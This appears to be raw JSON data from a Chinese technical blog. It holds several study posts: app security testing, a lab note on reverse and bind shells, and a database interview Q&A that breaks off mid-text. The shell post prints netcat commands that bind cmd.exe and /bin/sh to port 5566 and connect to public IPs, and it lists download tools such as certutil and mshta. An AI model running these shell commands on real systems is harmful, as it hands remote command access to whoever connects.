利用安卓逆向技术进行反编译，利用安全测试技术进行抓包，从反编译和抓包提取app的资产信息，找到有哪些接口、资产信息等。至于后面的安全测试是属于网站的、接口的、单个ip的，根据app的特性决定。\n * 从逆向的角度分析代码逻辑、设计问题\n\n\n# 使用h5语言开发\n\n\n# 简述：\n\n使用h5开发的好处有很多，可多端复用，比如浏览器，ios端，当然h5的开发体验是没有原生开发好的，如果说这个页面需要分享出去的话，就用h5开发。\n\n\n# 演示：\n\nhbuilder x + uni-app框架演示示例（h5&vue）\n\n * 编译以后，发现网站端和app端显示的是基本一样的\n * 通过该项目源码发现，是用html5来开发的，是专门针对app、小程序应用的\n * 数据传输是用vue框架，页面由h5负责\n * 和以前的php .net java jsp asp等语言不同，是用的h5&vue\n\n\n# 安全影响：\n\n * api&js框架安全问题、接口漏洞\n * 以前的php、.net漏洞都不存在了，类似于之前说的前后端分离\n\n\n# 小程序开发（属于h5+vue开发的一种）\n\n\n# 演示：\n\n在hbuilder x中点击文件-发行-小程序微信（仅适用于uni-app），用微信公众号送的appid发行\n\n此外，还需要用到【微信开发者工具】，用工具打开后，可以看到模拟微信的小程序界面\n\n\n# 渗透测试思路：\n\n和h5的测试思路相同，常规的php、.net漏洞都不存在了，需要找js框架漏洞，以及接口漏洞\n\n\n# 其他情况\n\n微信小程序可以通过封装普通的网站来实现，在封装的配置里选择小程序\n\n演示：【shopxo开源商城】 + 【一门app】\n\n**安全影响：**属于常规web安全测试（php那种）\n\n\n# 思维导图\n\n",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"20250108CTF学习笔记35",frontmatter:{title:"20250108CTF学习笔记35",date:"2025-01-08T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2025-01-08-CTFlearn.html",relativePath:"views/numerology/2025-01-08-CTFlearn.md",key:"v-8953e268",path:"/views/numerology/2025-01-08-CTFlearn.html",headers:[{level:2,title:"抓包",slug:"抓包",normalizedTitle:"抓包",charIndex:92},{level:2,title:"逆向",slug:"逆向",normalizedTitle:"逆向",charIndex:98},{level:2,title:"如何判断APP是原生开发还是网站搭建的？",slug:"如何判断app是原生开发还是网站搭建的",normalizedTitle:"如何判断app是原生开发还是网站搭建的？",charIndex:104}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第51天</p>\n<p>今日内容：基础入门-APP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"抓包 逆向 如何判断APP是原生开发还是网站搭建的？",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第51天\n\n今日内容：基础入门-APP架构&小程序&H5+Vue语言&Web封装&原生开发&Flutter\n\n\n\n * 抓包\n * 逆向\n * 如何判断APP是原生开发还是网站搭建的？\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第23章：基础入门-APP架构&小程序&H5+Vue语言&Web封装&原生开发&Flutter\n\n\n# 抓包\n\n抓包技术分很多种，如果用的是HTTP协议、HTTPS协议，如果HTTPS还需要证书，有些有证书校验，有些要绕过证书才能抓。如果不走HTTP、HTTPS协议，该怎么抓包呢？工具只支持HTTP、HTTPS抓包。比如登录、或者玩游戏的时候不走HTTP、HTTPS协议，怎么抓包？这些都是以后抓包的知识点。\n\n\n# 逆向\n\n我们用渗透测试用逆向，是观察、搜集资产信息，如IP、域名、服务等，这些都是从安全测试角度，如果专门搞逆向的话，是从APP的设计、代码、逻辑关系去测试。\n\n\n# 如何判断APP是原生开发还是网站搭建的？\n\n观察是否有网站特征，凭借经验来判断，看UI、看界面美观度，也可以反编译去看源码是什么结构，根据结构分类。",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第51天\n\n今日内容：基础入门-app架构&小程序&h5+vue语言&web封装&原生开发&flutter\n\n\n\n * 抓包\n * 逆向\n * 如何判断app是原生开发还是网站搭建的？\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第23章：基础入门-app架构&小程序&h5+vue语言&web封装&原生开发&flutter\n\n\n# 抓包\n\n抓包技术分很多种，如果用的是http协议、https协议，如果https还需要证书，有些有证书校验，有些要绕过证书才能抓。如果不走http、https协议，该怎么抓包呢？工具只支持http、https抓包。比如登录、或者玩游戏的时候不走http、https协议，怎么抓包？这些都是以后抓包的知识点。\n\n\n# 逆向\n\n我们用渗透测试用逆向，是观察、搜集资产信息，如ip、域名、服务等，这些都是从安全测试角度，如果专门搞逆向的话，是从app的设计、代码、逻辑关系去测试。\n\n\n# 如何判断app是原生开发还是网站搭建的？\n\n观察是否有网站特征，凭借经验来判断，看ui、看界面美观度，也可以反编译去看源码是什么结构，根据结构分类。",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"20250109CTF学习笔记35",frontmatter:{title:"20250109CTF学习笔记35",date:"2025-01-09T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2025-01-09-CTFLearn.html",relativePath:"views/numerology/2025-01-09-CTFLearn.md",key:"v-ffba32e4",path:"/views/numerology/2025-01-09-CTFLearn.html",headers:[{level:2,title:"文件上传下载-解决无图形化&解决数据传输",slug:"文件上传下载-解决无图形化-解决数据传输",normalizedTitle:"文件上传下载-解决无图形化&amp;解决数据传输",charIndex:null},{level:3,title:"演示",slug:"演示",normalizedTitle:"演示",charIndex:111},{level:3,title:"常规简单命令",slug:"常规简单命令",normalizedTitle:"常规简单命令",charIndex:119},{level:2,title:"反弹Shell",slug:"反弹shell",normalizedTitle:"反弹shell",charIndex:129},{level:3,title:"使用场景：",slug:"使用场景",normalizedTitle:"使用场景：",charIndex:142},{level:3,title:"目的：",slug:"目的",normalizedTitle:"目的：",charIndex:153},{level:3,title:"工作原理：",slug:"工作原理",normalizedTitle:"工作原理：",charIndex:162},{level:3,title:"演示：",slug:"演示-2",normalizedTitle:"演示：",charIndex:173},{level:3,title:"难点：",slug:"难点",normalizedTitle:"难点：",charIndex:182},{level:3,title:"正向连接演示：",slug:"正向连接演示",normalizedTitle:"正向连接演示：",charIndex:191}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第52天</p>\n<p>今日内容：基础入门-反弹SHELL&amp;带外查询&amp;正反向连接&amp;防火墙出入站&amp;文件下载</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"文件上传下载-解决无图形化&解决数据传输 演示 常规简单命令 反弹Shell 使用场景： 目的： 工作原理： 演示： 难点： 正向连接演示：",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第52天\n\n今日内容：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n\n * 文件上传下载-解决无图形化&解决数据传输\n   * 演示\n   * 常规简单命令\n * 反弹Shell\n   * 使用场景：\n   * 目的：\n   * 工作原理：\n   * 演示：\n   * 难点：\n   * 正向连接演示：\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第24章：基础入门-反弹SHELL&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n# 文件上传下载-解决无图形化&解决数据传输\n\n在不允许图形化界面的情况下，需要命令去上传下载。\n\n\n# 演示\n\nWindows Server 2012 + 【棱角社区文件下载命令生成工具】\n\n**思考：**这工具是在线工具，我不想用在线工具，是否能找一个能不用在线的工具？\n\n> 棱角社区文件下载命令生成工具可以用来生成下载命令，有PowerShell或者cmd命令，以及Linux命令等\n\n**步骤：**文件放到服务器上，构造一个地址，没有图形化页面，用远程命令的方式，将服务器的文件下载到电脑中。\n\n\n# 常规简单命令\n\n>  * 强烈推荐【PowerShell基础视频讲解】\n>  * 【常规基本渗透命令详解目录】\n\n * Linux: wget curl python ruby perl java等\n * Windows: PowerShell Certutil Bitsadmin msiexec mshta rund1132等\n\n\n# 反弹Shell\n\n\n# 使用场景：\n\n如果我们需要到服务器上执行 Shell 命令，但是因为防火墙等原因，无法由客户端主动发起连接的情况，就可以使用反弹 Shell 来满足登陆和操作的需求。\n\n\n# 目的：\n\n解决数据回显&解决数据通讯\n\n * 解决数据回显：\n   \n   root@xiaodi:/tmp# useradd xiaodisec\n   root@xiaodi:/tmp# passwd xiaodisec\n   Enter new UNIX password:\n   Retype new UNIX password:\n   Enter new UNIX password:\n   Retype new UNIX password:\n   Enter new UNIX password:\n   Retype new UNIX password:\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   \n   \n   我们可以看到，如果我们在输入密码的时候不输入，直接回车，就会一直让你输入密码。假设我们在网上遇到一个漏洞，而这个漏洞需要去执行命令，类似这种需要输入的，等待输入就能往下进行。这时不会把对方的界面给到我们，我们动不了，可以把界面反弹到我们这边，我们再用这个命令就行了。反弹Shell就是把命令的输入输出转移到其他主机\n\n * 解决数据通信问题：\n   \n   正常漏洞，执行一条命令，回显一条命令。比如我们提交一个文件，一直提交提交提交，我们一直有流量过去，如果将命令反弹回来，就相当于命令在本地执行一样。意思是将对方的权限移交给我们。（视频中是这么解释的，但我用AI解释的结果是在企业内部网络，服务器多为内部私有 IP（如 192.168.x.x），经 NAT 设备连外网。外部攻击者是公网 IP，因 NAT 隐藏内部 IP 且限制外对内访问，无法直连服务器内部服务。而反弹 Shell 可突破限制，让目标服务器主动连接。比如，攻击者在公网设可访问服务器并监听端口，利用漏洞使目标服务器 Shell 连此端口，建立通信通道，双方借此通信。）\n\n\n# 工作原理：\n\n攻击者在其自己的机器上设置监听端口，然后诱使受害者的机器执行一个反向连接的 Shell 命令，连接回攻击者的机器。这样，攻击者就能通过这个反向连接执行命令，控制受害者的计算机。\n\n\n# 演示：\n\nWindows Server 2012 + 【棱角社区反弹Shell工具】\n\n可以反弹的语言相当多，主要演示linux中的工具之一ncat\n\nNC(ncat)瑞士军刀：linux系统下自带，windows下需要下载。\n\n\n# 难点：\n\n 1. 正向连接\n 2. 反向连接\n\n从图中我们看到，如果我们用linux服务器连windows服务器，有两种方法实现，一种正向，一种反向，需要看参照物，如果我们是主动找对方，就是正向；如果是对方放过来找我们，就是反向。\n\n\n\n\n# 正向连接演示：\n\nLinux控制Windows：\n\n 1. Windows上边要绑定CMD到本地5566端口\n\nnc -e cmd -lvp 5566\n\n\n1\n\n\n> Windows上没有nc工具，需要自己下载一个nc.exe工具【下载地址】，使用命令时如果不加环境变量就要写成nc.exe\n\n 2. Linux上边需要主动连接目标5566\n    \n    ncat 47.122.23.131 5566\n    \n    \n    1\n    \n    \n    \n    \n    完成以后，发现可以在linux端输入命令，然后返回结果也是在linux显示的\n\nWindows控制Linux：\n\n 1. 在linux上绑定SH到本地5566端口\n    \n    ncat -e /bin/sh -lvp 5566\n    \n    \n    1\n    \n\n 2. 在Windows上主动连接目标5566\n    \n    nc 47.94.236.117 5566\n    \n    \n    1\n    \n    \n    在复现时发现我在Vmware安装的Centos系统不能用Windows连接，查阅资料发现应该是防火墙问题，尝试关闭Linux系统的防火墙失败，理论上是可行的。\n\n正向连接原理：\n\n * 本地监听，等待连接\n * 正向连接是谁监听，就是控制谁\n * ",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第52天\n\n今日内容：基础入门-反弹shell&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n\n * 文件上传下载-解决无图形化&解决数据传输\n   * 演示\n   * 常规简单命令\n * 反弹shell\n   * 使用场景：\n   * 目的：\n   * 工作原理：\n   * 演示：\n   * 难点：\n   * 正向连接演示：\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第24章：基础入门-反弹shell&带外查询&正反向连接&防火墙出入站&文件下载\n\n\n# 文件上传下载-解决无图形化&解决数据传输\n\n在不允许图形化界面的情况下，需要命令去上传下载。\n\n\n# 演示\n\nwindows server 2012 + 【棱角社区文件下载命令生成工具】\n\n**思考：**这工具是在线工具，我不想用在线工具，是否能找一个能不用在线的工具？\n\n> 棱角社区文件下载命令生成工具可以用来生成下载命令，有powershell或者cmd命令，以及linux命令等\n\n**步骤：**文件放到服务器上，构造一个地址，没有图形化页面，用远程命令的方式，将服务器的文件下载到电脑中。\n\n\n# 常规简单命令\n\n>  * 强烈推荐【powershell基础视频讲解】\n>  * 【常规基本渗透命令详解目录】\n\n * linux: wget curl python ruby perl java等\n * windows: powershell certutil bitsadmin msiexec mshta rund1132等\n\n\n# 反弹shell\n\n\n# 使用场景：\n\n如果我们需要到服务器上执行 shell 命令，但是因为防火墙等原因，无法由客户端主动发起连接的情况，就可以使用反弹 shell 来满足登陆和操作的需求。\n\n\n# 目的：\n\n解决数据回显&解决数据通讯\n\n * 解决数据回显：\n   \n   root@xiaodi:/tmp# useradd xiaodisec\n   root@xiaodi:/tmp# passwd xiaodisec\n   enter new unix password:\n   retype new unix password:\n   enter new unix password:\n   retype new unix password:\n   enter new unix password:\n   retype new unix password:\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   \n   \n   我们可以看到，如果我们在输入密码的时候不输入，直接回车，就会一直让你输入密码。假设我们在网上遇到一个漏洞，而这个漏洞需要去执行命令，类似这种需要输入的，等待输入就能往下进行。这时不会把对方的界面给到我们，我们动不了，可以把界面反弹到我们这边，我们再用这个命令就行了。反弹shell就是把命令的输入输出转移到其他主机\n\n * 解决数据通信问题：\n   \n   正常漏洞，执行一条命令，回显一条命令。比如我们提交一个文件，一直提交提交提交，我们一直有流量过去，如果将命令反弹回来，就相当于命令在本地执行一样。意思是将对方的权限移交给我们。（视频中是这么解释的，但我用ai解释的结果是在企业内部网络，服务器多为内部私有 ip（如 192.168.x.x），经 nat 设备连外网。外部攻击者是公网 ip，因 nat 隐藏内部 ip 且限制外对内访问，无法直连服务器内部服务。而反弹 shell 可突破限制，让目标服务器主动连接。比如，攻击者在公网设可访问服务器并监听端口，利用漏洞使目标服务器 shell 连此端口，建立通信通道，双方借此通信。）\n\n\n# 工作原理：\n\n攻击者在其自己的机器上设置监听端口，然后诱使受害者的机器执行一个反向连接的 shell 命令，连接回攻击者的机器。这样，攻击者就能通过这个反向连接执行命令，控制受害者的计算机。\n\n\n# 演示：\n\nwindows server 2012 + 【棱角社区反弹shell工具】\n\n可以反弹的语言相当多，主要演示linux中的工具之一ncat\n\nnc(ncat)瑞士军刀：linux系统下自带，windows下需要下载。\n\n\n# 难点：\n\n 1. 正向连接\n 2. 反向连接\n\n从图中我们看到，如果我们用linux服务器连windows服务器，有两种方法实现，一种正向，一种反向，需要看参照物，如果我们是主动找对方，就是正向；如果是对方放过来找我们，就是反向。\n\n\n\n\n# 正向连接演示：\n\nlinux控制windows：\n\n 1. windows上边要绑定cmd到本地5566端口\n\nnc -e cmd -lvp 5566\n\n\n1\n\n\n> windows上没有nc工具，需要自己下载一个nc.exe工具【下载地址】，使用命令时如果不加环境变量就要写成nc.exe\n\n 2. linux上边需要主动连接目标5566\n    \n    ncat 47.122.23.131 5566\n    \n    \n    1\n    \n    \n    \n    \n    完成以后，发现可以在linux端输入命令，然后返回结果也是在linux显示的\n\nwindows控制linux：\n\n 1. 在linux上绑定sh到本地5566端口\n    \n    ncat -e /bin/sh -lvp 5566\n    \n    \n    1\n    \n\n 2. 在windows上主动连接目标5566\n    \n    nc 47.94.236.117 5566\n    \n    \n    1\n    \n    \n    在复现时发现我在vmware安装的centos系统不能用windows连接，查阅资料发现应该是防火墙问题，尝试关闭linux系统的防火墙失败，理论上是可行的。\n\n正向连接原理：\n\n * 本地监听，等待连接\n * 正向连接是谁监听，就是控制谁\n * ",charsets:{cjk:!0},lastUpdated:"2025/01/10, 21:43:44",lastUpdatedTimestamp:1736516624e3},{title:"Q&A宝典-数据库基础篇",frontmatter:{title:"Q&A宝典-数据库基础篇",date:"2019-10-20T00:00:00.000Z",tags:["复习"],categories:["知识晶体 Q&A"],isShowComments:!1},regularPath:"/views/qaq/sum_db_001.html",relativePath:"views/qaq/sum_db_001.md",key:"v-1d7a64da",path:"/views/qaq/sum_db_001.html",headers:[{level:2,title:"第一天",slug:"第一天",normalizedTitle:"第一天",charIndex:2},{level:2,title:"第二天",slug:"第二天",normalizedTitle:"第二天",charIndex:1181},{level:2,title:"第三天",slug:"第三天",normalizedTitle:"第三天",charIndex:3163},{level:2,title:"第四天",slug:"第四天",normalizedTitle:"第四天",charIndex:4473},{level:2,title:"第五天",slug:"第五天",normalizedTitle:"第五天",charIndex:6295}],headersStr:"第一天 第二天 第三天 第四天 第五天",content:"# 第一天\n\n1. 分页怎么实现的\n * Mysql分页使用limit：select 列名 from 表名 limit 10,10;\n * Oracle分页使用rownum：select a.* from (select rownum rw, 列名 from 表名 where 条件) a where a.rw>数字 and a.rw<=y;\n\n2. sql语句优化\n 1. 合理使用索引\n 2. 用exists代替in，exists是直接判断存不存在，而in会挨个比较\n 3. 复杂的业务功能可以使用存储过程\n 4. 应尽量避免在 where 子句中使用!=、<>、or、in、not in操作符，否则将引擎放弃使用索引而进行全表扫描\n 5. 能多表关联的尽量不写子查询\n 6. 避免%xxx式查询，前置%查询会导致查全表\n\n3. Oracle中drop 和truncate的区别？\n * drop是删除表，不会释放表原先占有的内存空间；\n * truncate是截断表，能够释放表中数据所占有的内存空间，保留表结构；\n\n如果使用drop table 表名 purge;语句则能够直接释放表占有的内存空间。\n\n4. delete，drop，truncate 区别？\n\ndelete，drop，truncate 都有删除表的作用，区别在于：\n\n * delete 和 truncate 仅仅删除表数据，drop 连表数据和表结构一起删除，打个比方，delete 是单杀，truncate 是团灭，drop 是把电脑摔了。\n * delete 是 DML 语句，操作完以后如果没有不想提交事务还可以回滚，truncate 和 drop 是 DDL 语句，操作完马上生效，不能回滚，打个比方，delete 是发微信说分手，后悔还可以撤回，truncate 和 drop 是直接扇耳光说滚，不能反悔。\n * 执行的速度上，drop>truncate>delete，打个比方，drop 是神舟火箭，truncate 是和谐号动车，delete 是自行车。\n\n5. 左外连接，右外连接，说一下?\n\n * 左外连接：from 原表 left join 新表 on 关联关系\n   原表和新表能够关联的数据+无法通过关联关系关联到原表的数据\n\n * 右外连接：from 原表 right join 新表 on 关联关系\n   原表和新表能够关联的数据+无法通过关联关系关联到新表的数据\n\n6. sql语句中怎么判断一个字段是不是空\n\n与空判断使用is null或者is not null\n\n7. 数据源、数据库连接池、DBCP三者的关系？\n 1. 数据源：是连接数据库的一个标准\n 2. 数据库：连接池是实现数据源的一种解决方案\n 3. DBCP：是连接池的具体实现\n\n\n# 第二天\n\n1. Mysql和Oracle的区别\n 1. Oracle使用rownum来实现分页，MySQL使用limit实现分页\n\n-- - mysql查询行号\nselect \n\tw.id,\n\t@rowno := @rowno + 1 AS rowno,\n\t-- 查到当前这一行的行号\n\tCASE WHEN w.ID ='123456' THEN\n@rowno END currentrowno \n\tfrom table w order by w.rowno;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. Oracle没有主键自增特性,可以使用调用序列的方式来实现主键自增；MySQL可以在主键列之后添加auto_increment设置自增特性\n 3. Oracle有表空间的概念，MySQL没有表空间\n 4. Oracle的分组函数中select之后不能直接写非分组的其他列；MySQL如果没有聚组函数则可以写 其他列\n 5. Oracle的表存放在用户（其实是schema对象）所属的表空间的数据文件中，   mySQL的表存放在某个database中（mysql一个root用户下可以有很多database）\n 6. Oracle中的一些函数和MySQL也不一样 如：ORACLE：substr('abcd',2,2) ，MYSQL：substring('abcd',2,2),ORACLE：to_char(sysdate,'yyyy-mm-dd') ，MYSQL：date_format(now(),'%Y-%m-%d')\n 7. Oracle中的字符类型可以使用varchar2，MySQL不能使用该类型\n\n2. jdbc怎样执行sql语句？\n 1. 加载驱动\n 2. 通过驱动管理对象获得连接\n 3. 获得执行器对象编写SQL语句,JAVA中用String类型表示SQL\n 4. 通过执行器执行SQL语句\n    常用的执行SQL语句的方法有:  execute()  boolean (执行select语句时返回true,因为select能够返回一个查询结果 其他命令开头的语句返回false)； executeUpdate()  int； executeQuery()   ResultSet\n 5. 释放资源\n\n3. 索引用过吗？在什么情况下会导致索引失效？用索引还需要注意哪些问题呢？索引分为几种？\n\n * 用过；如果有索引的列空值比较多、重复数据比较多的话索引不起作用。   通常索引用在查询较多而增删改较少的列，因为索引也会花时间自己维护会降低增删改的效率。\n\n * 常用的索引有普通索引、唯一性索引、位图索引，如果某个列上经常使用函数，还可以建一个函数索引。\n\n4. like 用过吗？怎么用的？\n\nlike常用来实现模糊查询，与%和_匹配使用，如果需要匹配特殊字符，则需要使用escape逃离符。\n例:搜索以“QA_”开头的数据：select code from 表 where code like 'QA/_%' escape '/'\n\n5. union 和union all的区别\n * 都是取并集，可以用来代替 or\n\n例如：有{1，2，3}和{2，3，4}\n  union 能够去除重复数据 (做排序操作)（1，2，3，4）\n  union all 不会做去重操作 效率高 （1，2，2，3，3，4）\n\n * 多个查询语句必须有相同的列数\n   多个查询语句中的列对应的数据类型必须一致\n   如：select ename,job from emp01   union   select ename,job from emp02;\n\n6. 事务的特性\n * 事务四大特性(简称ACID)\n\n 1. 原子性(Atomicity)： 事务中的全部操作在数据库中是不可分割的，要么全部完成，要么均不执行。\n 2. 一致性(Consistency)： 事务必须是使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的。\n 3. 隔离性(Isolation)： 事务的执行不受其他事务的干扰。\n 4. 持久性(Durability)： 能够将提交的数据持久化到数据库中。\n\n7. 什么是事务？特征？JDBC如何控制事务？\n\n * 多条sql语句作为 一个执行单元，要么全部执行，要么全不执行\n\n * 四大特性：原子性，一致性，隔离性，持久性\n\n * JDBC控制事务：\n   \n   * 开始事务：connection.setAutoCommit(false);\n   * 执行sql语句\n   * 提交:connection.commit();\n   * 回滚：Connection.rollback();\n\n\n# 第三天\n\n1. 存储过程、视图、触发器\n\n * 存储过程 procedure： 在服务器端，能够被多个程序调用的一段SQL语句块。\n   简单来说就是事先用数据库语言写好的一段功能，能够像函数一样被程序调用，但是存储过程本身没有返回值，是通过返回参数的形式返回数据。\n\n * 视图 View ： 视图其实就是伪表，将编译后的SQL语句保存在数据库中，拿出只想让用户看见的字段，这就是视图。\n   一般来讲视图不能创建索引（因为视图本身只是一个编译后的查询语句，索引只能创建在表的列上），但是Oracle提供了一种物化视图可以创建索引（物化视图：虽然叫视图但是实际类似于表，将数据暂时存储并在基表刷新或者提交数据时刷新本视图以便与基表数据保持一致）。\n\n * 触发器 trigger： 一种特殊的存储过程，不需要调用，在满足条件时触发。\n   触发条件：在对某个表做insert 、 update 或delete操作之前或之后（取决于如何实现）自动执行\n\n2. 如何调用存储过程？\n 1. JDBC中使用CallableStatement执行器对象，通过execute(\"{call  过程名(?,?)}\") 的方式来调用；\n 2. PL/SQL Developer工具中可以通过declare begin 过程名(参数);  end;的方式调用；\n\n3. 备份数据\n 1. 第一种方式： 通过导入导出命令备份数据库中全部数据\n    Oracle用exp命令导出数据，MySQL使用mysqldump命令备份数据\n 2. 第二种方式： 使用工具导出数据\n\n4. in与exists的区别? 那个效率更高?\n\nexists效率更高\n\n * in :需要通过条件比较结果中的所有数据\n * exists: 只关心子查询能够查询出数据\n\n5. 悲观锁与乐观锁?\n\n * 悲观锁: 在操作表时认为另外一个对表的操作会修改数据\n   1.所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到它拿到锁（共享资源每次只给一个线程使用，其它线程阻塞，用完后再把资源转让给其它线程）。\n   2.java中synchronized和ReentrantLock等独占锁就是悲观锁思想的实现。\n   3.传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁。\n\n * 乐观锁: 在操作表时认为别的操作不会对表有修改数据的操作\n   1.所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号机制(原子类)和CAS算法实现。\n   2.乐观锁适用于多读的应用类型，这样可以提高吞吐量。\n\n6. Hibernate中常见的主键增长策略？\n * Assigned:在调用save方法之前设置，自定义主键增长方式\n * Identity:建表语句必须支持auto_increment\n * Sequence:指定序列生成主键\n * Native:底层自动选择合适的策略\n * Increment：最大值+1的方式\n * Uuid:生成32为字符串\n\n\n# 第四天\n\n1. 结构化查询语言都是什么？\n 1. DDL alter drop truncate create\n 2. DML insert delete update\n 3. DQL select\n 4. DCL grant revoke\n 5. TCL commit rollback savepoint\n\n2. drop和truncate的区别?\n * drop：删除表结构和表数据(如果删除表空间的话需要+purge)\n * truncate：删除表数据和表空间，会保留表结构\n\n3. 组函数?多行函数?\n * sum() avg() count() max() min()\n\n4. 怎么去重？\n 1. distinct 专业去重(支持多列) select distinct salary,name from student;\n 2. group by 聚合统计\n\n5. 什么时候使用多表连接？什么时候使用子查询？\n 1. 如果需要查询的数据在多个表中,一定要使用多表连接\n 2. 不需要表A中的列,但是下需要表A中的条件,可以用子查询\n 3. 子查询中如果使用了in some any all这几个关键字,效率比较低,可以转换成多表关联\n\n6. 为什么要使用视图?\n 1. 节省编译时间,提高查询效率\n 2. 屏蔽原表中的字段，避免没有权限的用户查询到其他字段\n 3. 视图的数据能够动态的来源于原表\n 4. 简单的视图可以更新视图中的数据，复杂的视图无法更新\n    create view 视图名 as select name from student;\n\n7. 为什么要给普通用户创建属于自己的表空间?\n 1. 项目中很有可能与其他项目使用同一个数据库, 多个用户在使用用一个数据库时有可能访问同一个数据库文件, 就会产生资源争用的问题。给不同的用户指定不同的表空间， 就可以让他们使用不同的数据库文件，解决资源争用的问题。\n 2. 给予用户部分权限\n\n8. 约束有哪几种?\n 1. 外键约束 foreign key references\n 2. 唯一约束 unique\n 3. 非空约束 not null\n 4. 主键约束 primary key\n 5. 检查约束 check\n\n9. 索引有哪几种?\n 1. 函数索引\n 2. 普通索引 normal\n 3. 唯一索引 unique\n 4. 位图索引 bitmap（适合在数据量比较大，基数比较小的列 如：男/女）\n\n10. 索引的优缺点?\n * 能够更快的帮助我们提高查询效率\n * 索引会降低数据库的增删改的效率，因为数据库需要花时间去维护索引,所以索引适合数据量比较大而且数据不经常改动的列\n\n11. sql语句怎么优化?\n 1. 尽量用exists代替in\n 2. 合理使用索引\n 3. 查询多个表中的数据时,尽量用多表连接\n 4. 多表连接时尽量把多的数据放在where之后\n 5. 多表连接时尽量使用表的别名,减少数据库的解析时间\n 6. 在确保语句完整的情况下,多使用commit提交语句\n 7. 优化group by，将不需要的记录在group by之前过滤掉\n\n12. 查询语句常见的关键字的优先级?\n 1. select 列名 优先级高于order by\n 2. from 表明 优先级最高\n 3. where 条件 优先级次高\n 4. group by条件 优先级次于where\n 5. having 条件 优先级一定在group by之后\n 6. order by分组 优先级最低\n\n13. Oracle分页\n\nrownum，这是Oracle对动态查询结果的编号，用来实现分页查询有序的整数列，每多一条自动加1\n\n 1. 不能和 group by 在同一个查询语句中\n 2. 不能用 表名.rownum\n 3. 它肯定是从1开始\n\n * 编号21-30，实现排序效果的分页\n\nselect rownum,a.*\n   \tfrom\n   \t\t(select rownum rn,b.* \n         from (select * from student order by salary) b\n         where rownum <=30) a\n   \twhere\n   \t\ta.rn >=21;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 第五天\n\n1. mysql 引擎 b+树索引（文件系统常用索引）\n\n> https://www.cnblogs.com/tiancai/p/9024351.html\n\n * 平衡二叉树：每个节点只保存一份数据\n\n * b树：每个节点可以保存多份数据，减少磁盘I/O所花的时间。\n\nB树在提高了IO性能的同时并没有解决元素遍历的效率低下的问题，正是为了解决这个问题，B+树应用而生。B+树只需要去遍历叶子节点就可以实现整棵树的遍历。而且在数据库中基于范围的查询是非常频繁的，而B树不支持这样的操作或者说效率太低。\n\n * b+树：只有最底层的叶子节点（文件）保存数据，非叶子节点只保存索引。\n\n由于B+树的数据都存储在叶子结点中，分支结点均为索引，方便扫库，只需要扫一遍叶子结点即可，但是B树因为其分支结点同样存储着数据，我们要找到具体的数据，需要进行一次中序遍历按序来扫，所以B+树更加适合在区间查询的情况，所以通常B+树用于数据库索引。\n\n非叶子节点的子树指针与关键字个数相同。B+树的查询效率更加稳定：由于非终结点并不是最终指向文件内容的结点，而只是叶子结点中关键字的索引。所以任何关键字的查找必须走一条从根结点到叶子结点的路。所有关键字查询的路径长度相同，导致每一个数据的查询效率相当。",normalizedContent:"# 第一天\n\n1. 分页怎么实现的\n * mysql分页使用limit：select 列名 from 表名 limit 10,10;\n * oracle分页使用rownum：select a.* from (select rownum rw, 列名 from 表名 where 条件) a where a.rw>数字 and a.rw<=y;\n\n2. sql语句优化\n 1. 合理使用索引\n 2. 用exists代替in，exists是直接判断存不存在，而in会挨个比较\n 3. 复杂的业务功能可以使用存储过程\n 4. 应尽量避免在 where 子句中使用!=、<>、or、in、not in操作符，否则将引擎放弃使用索引而进行全表扫描\n 5. 能多表关联的尽量不写子查询\n 6. 避免%xxx式查询，前置%查询会导致查全表\n\n3. oracle中drop 和truncate的区别？\n * drop是删除表，不会释放表原先占有的内存空间；\n * truncate是截断表，能够释放表中数据所占有的内存空间，保留表结构；\n\n如果使用drop table 表名 purge;语句则能够直接释放表占有的内存空间。\n\n4. delete，drop，truncate 区别？\n\ndelete，drop，truncate 都有删除表的作用，区别在于：\n\n * delete 和 truncate 仅仅删除表数据，drop 连表数据和表结构一起删除，打个比方，delete 是单杀，truncate 是团灭，drop 